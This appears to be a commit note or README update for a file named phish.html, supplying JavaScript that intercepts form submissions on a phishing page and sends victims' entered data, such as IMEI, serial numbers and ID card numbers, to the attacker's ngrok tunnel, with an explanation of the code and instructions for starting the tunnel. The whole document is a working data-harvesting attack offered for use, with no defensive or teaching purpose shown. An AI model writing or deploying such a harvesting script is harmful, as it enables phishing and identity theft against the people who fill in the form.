Update phish.html
Thses is a script to print the data out on the terminal under the ngrok tunnel ,.. if you add these javascript code to the html script , the targets input data e.g IMEI , Serial Number, ID card number , will be phished and dispalyed under the ngrok tunnel ...
<script>
const form = document.querySelector('form');

form.addEventListener('submit', (event) => {
  event.preventDefault();

  const data = new FormData(form);

  const request = new XMLHttpRequest();
  request.open('POST', `https://<your ngrok url>/`);
  request.send(data);

  request.onload = () => {
    if (request.status === 200) {
      const response = JSON.parse(request.responseText);

      console.log(response);
    } else {
      console.log('Error: ' + request.statusText);
    }
  };
});
<script>
This script first gets the form element from the DOM. Then, it listens for the submit event on the form. When the form is submitted, the script gets the form data and creates a new XMLHttpRequest object. The XMLHttpRequest object is used to send the form data to the ngrok server. The script also listens for the onload event on the XMLHttpRequest object. When the request is complete, the script checks the status code of the response. If the status code is 200, the script parses the response text as JSON and logs the response to the console. Otherwise, the script logs an error message to the console.

To use this script, you will need to replace the <your ngrok url> placeholder with the URL of your ngrok tunnel. You can get the URL of your ngrok tunnel by running the following command:

ngrok http 8080
This will start a ngrok tunnel on port 8080. The output of the command will include the URL of your ngrok tunnel